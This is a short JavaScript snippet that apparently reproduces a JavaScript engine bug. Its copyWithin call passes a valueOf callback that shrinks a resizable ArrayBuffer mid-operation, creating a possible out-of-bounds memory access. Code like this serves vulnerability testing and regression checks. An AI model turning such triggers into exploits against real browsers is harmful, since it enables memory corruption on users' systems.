const ab = new ArrayBuffer(0x1000, {"maxByteLength": 0x4000});
const u8 = new Uint8Array(ab);
function call_back() {
    ab.resize(0);
    return 0;
}
u8.copyWithin(0x20, {valueOf:call_back});
